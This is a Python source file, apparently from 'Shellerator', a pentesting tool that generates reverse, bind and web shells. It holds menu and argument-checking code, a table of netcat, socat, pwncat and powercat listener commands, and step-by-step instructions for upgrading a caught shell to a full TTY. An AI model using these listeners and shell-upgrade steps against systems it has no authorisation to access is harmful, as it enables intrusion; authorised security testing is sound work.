#!/usr/bin/python3
# Author: Charlie BROMBERG (Shutdown - @_nwodtuhs)

import argparse
import sys
import json
import socket
import subprocess
import tempfile
import signal
import ipaddress
from importlib import resources

import psutil
from colorama import Fore
from colorama import Style
import platform
if platform.system() == 'Windows':
    from consolemenu import *
else:
    from simple_term_menu import TerminalMenu

def signal_handler(sig, frame):
    exit(1)

signal.signal(signal.SIGINT, signal_handler)

def menu(title, menu_list):
    if platform.system() == 'Windows':
        selection = SelectionMenu.get_selection(menu_list, title=title, show_exit_option=False)
    else:
        menu = TerminalMenu(menu_list, title=title)
        selection = menu.show()
    return menu_list[selection]

def menu_with_custom_choice(title, menu_list):
    menu_list.append('Custom')
    selection = menu(title, menu_list)
    if selection == 'Custom':
        print(f'(custom) {title}')
        if platform.system() == 'Windows':
            selection = input('>> ')
        else:
            selection = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL)
        return selection
    else:
        return selection.split('(')[1].split(')')[0]

def select_address():
    interfaces = {}
    net_if_addrs = psutil.net_if_addrs()
    for iface, addr in net_if_addrs.items():
        if iface == 'lo':
            continue
        for address in addr:
            if address.family == socket.AF_INET:
                interfaces.update({iface:address.address})

    menu_list = []
    for key in interfaces:
        menu_list.append(key + ' (' + interfaces[key] + ')')

    return menu_with_custom_choice("Listener interface/address?", menu_list)

def check_shell_args(shells, args):
    # Check if the type of shell specified by the user is supported by Shellerator
    try:
        shells[args.SHELLTYPE][args.TYPE]
    except KeyError:
        sys.exit(f"{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} No {args.SHELLTYPE} found for {Fore.RED + Style.BRIGHT}{args.TYPE}{Style.RESET_ALL}! Please run '{Fore.YELLOW + Style.BRIGHT}shellerator -l{Style.RESET_ALL}' to list the supported type of shells!")

    # Check if the port number specified by the user is correct
    if args.SHELLTYPE != "webshells":
        try:
            if int(args.LPORT) < 1 or int(args.LPORT) > 65535:
                raise ValueError
        except ValueError:
            sys.exit(f"{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} Invalid port number specified {Fore.RED + Style.BRIGHT}({args.LPORT}){Style.RESET_ALL}!")

        # Check if the IP address specified by the user is an IPv4
        if args.SHELLTYPE != "bindshells":
            try:
                isinstance(ipaddress.ip_address(args.LHOST), ipaddress.IPv4Address)
            except ValueError:
                sys.exit(f"{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} Invalid IPv4 specified {Fore.RED + Style.BRIGHT}({args.LHOST}){Style.RESET_ALL}!")

def list_shells(revshells, bindshells, webshells):
    print(f"{Fore.BLUE + Style.BRIGHT} Reverse shells {Style.RESET_ALL}")
    for revshell in sorted(revshells.keys()):
        print(f"   - {revshell}")
    print(f"\n{Fore.BLUE + Style.BRIGHT} Bindshells {Style.RESET_ALL}")
    for bindshell in sorted(bindshells.keys()):
        print(f"   - {bindshell}")
    print(f"\n{Fore.BLUE + Style.BRIGHT} Webshells {Style.RESET_ALL}")
    for webshell in sorted(webshells.keys()):
        print(f"   - {webshell}")

# Return list of listeners for reverse shells
def get_listeners(lport,verbosity=False):
    listeners = {
        'netcat': f"nc -nlvp {lport}",
        'rlwrap + nc': f"rlwrap -cAr nc -nlvp {lport}",
        'penelope': f"penelope -p {lport}",
        'ConPty': f"stty raw -echo; (stty size; cat) | nc -nlvp {lport}",
        'pwncat (linux)': f"pwncat-cs -lp {lport}",
        'pwncat (windows)': f"python3 -m pwncat -m windows -lp {lport}",
        'socat': f'socat file:`tty`,raw,echo=0 TCP-L:{lport}',
        'ncat (TLS)': f'ncat --ssl -lvnp {lport}',
        'busybox nc': f'busybox nc -lp {lport}',
        'powercat': f"powercat -l -p {lport}"
    }
    comments = {
        'rlwrap + nc': f" {Fore.YELLOW + Style.BRIGHT}(Simple alternative for upgrading Windows reverse shells){Style.RESET_ALL}",
        'penelope': f" {Fore.YELLOW + Style.BRIGHT}(Great for upgrading Linux reverse shells){Style.RESET_ALL}",
        'ConPty': f" {Fore.YELLOW + Style.BRIGHT}(Great for upgrading Windows reverse shells){Style.RESET_ALL}",
        'socat': f" {Fore.YELLOW + Style.BRIGHT}(Provide a fully interactive TTY. The Linux target must have socat installed){Style.RESET_ALL}"
    }

    return {
        listener: command.format(lport=lport) + (comments.get(listener, "") if verbosity else "") for listener, command in listeners.items()
    }
    
def format_shell(shell_index, shell, comment):
    return f"{Fore.BLUE + Style.BRIGHT}[{str(shell_index + 1)}]{Style.RESET_ALL} {shell.strip()}{Fore.YELLOW + Style.BRIGHT} ({comment}){Style.RESET_ALL}" if comment.strip() else f"{Fore.BLUE + Style.BRIGHT}[{str(shell_index + 1)}]{Style.RESET_ALL} {shell.strip()}"

def upgrade_tty(verbosity=False):
    if verbosity:
        return f"""\n{Fore.RED + Style.BRIGHT}[Upgrade your TTY]{Style.RESET_ALL}
{Fore.BLUE + Style.BRIGHT}[1]{Style.RESET_ALL} Execute any of the following commands from your reverse shell to obtain a TTY:
python -c 'import pty; pty.spawn("/bin/bash")'
script -q /dev/null -c /bin/bash
-- 
{Fore.BLUE + Style.BRIGHT}[2]{Style.RESET_ALL} Press {Fore.YELLOW + Style.BRIGHT}Ctrl+Z{Style.RESET_ALL} to background your TTY, then run:
stty size{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}(Returns the rows and columns of your current terminal window){Style.RESET_ALL}
stty raw -echo; fg{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}(Prevents commands to be echoed, enables tab completion, handles Ctrl+C, etc.){Style.RESET_ALL}
Press {Fore.YELLOW + Style.BRIGHT}[ENTER]{Style.RESET_ALL} to continue
--
{Fore.BLUE + Style.BRIGHT}[3]{Style.RESET_ALL} Reset your shell, export the SHELL and TERM environment variables, and set a proper terminal size to avoid text overlapping:
reset
export SHELL=bash
export TERM=xterm-256color
stty rows `<rows>` columns `<columns>`{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}(Replace `<rows>` and `<columns>` with the values returned by `stty size`.){Style.RESET_ALL}

Enjoy your shell ^^
"""
    else :
        return f"""\n{Fore.RED + Style.BRIGHT}[Upgrade your TTY]{Style.RESET_ALL}
{Fore.BLUE + Style.BRIGHT}[1]{Style.RESET_ALL} Execute any of the following commands from your reverse shell to obtain a TTY:
python -c 'import pty; pty.spawn("/bin/bash")'
script -q /dev/null -c /bin/bash{Style.RESET_ALL}
-
{Fore.BLUE + Style.BRIGHT}[2]{Style.RESET_ALL} Press {Fore.YELLOW + Style.BRIGHT}Ctrl+Z{Style.RESET_ALL} to background your TTY, then run:
stty size
stty raw -echo; fg
Press {Fore.YELLOW + Style.BRIGHT}[ENTER]{Style.RESET_ALL} to continue
-
{Fore.BLUE + Style.BRIGHT}[3]{Style.RESET_ALL} Reset your shell, export the SHELL and TERM environment variables, and set a proper terminal size to avoid text overlapping:
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <rows> columns <columns>

Enjoy your shell ^^
    """

